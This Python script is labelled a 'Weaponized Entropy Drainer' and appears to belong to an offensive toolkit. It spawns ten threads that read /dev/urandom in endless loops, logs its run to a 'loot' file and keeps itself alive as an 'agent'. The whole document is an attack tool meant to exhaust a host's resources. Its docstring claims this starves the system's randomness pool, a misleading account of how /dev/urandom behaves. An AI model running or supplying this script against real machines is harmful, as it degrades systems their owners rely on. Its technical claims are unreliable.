import os
import sys
import threading
import time

def drain_entropy():
    """
    Weaponized Entropy Drainer: Constantly reads from /dev/urandom 
    in high-speed loops to starve the system's randomness pool.
    """
    print("[*] Initializing Entropy Exhaustion...")
    
    def worker():
        try:
            # Open the raw device
            with open("/dev/urandom", "rb") as f:
                while True:
                    # Read 1MB chunks as fast as possible
                    _ = f.read(1024 * 1024)
        except Exception:
            pass

    # Spawn 10 threads to maximize CPU and I/O pressure on the PRNG
    threads = []
    for i in range(10):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    print(f"[!!!] SUCCESS: 10 threads active. Entropy pool is being drained.")
    
    # Log to project loot
    loot_path = "../../../loot/forensic_history.log"
    with open(loot_path, "a") as log:
        log.write(f"Type: ENTROPY_DRAIN | Status: RUNNING | PID: {os.getpid()}\n")

    # Keep the agent alive
    try:
        while True:
            # Monitor entropy availability (bits)
            if os.path.exists("/proc/sys/kernel/random/entropy_avail"):
                with open("/proc/sys/kernel/random/entropy_avail", "r") as f:
                    val = f.read().strip()
                    # print(f"[*] Current Entropy: {val} bits", end='\r')
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping Drainer.")

if __name__ == "__main__":
    drain_entropy()
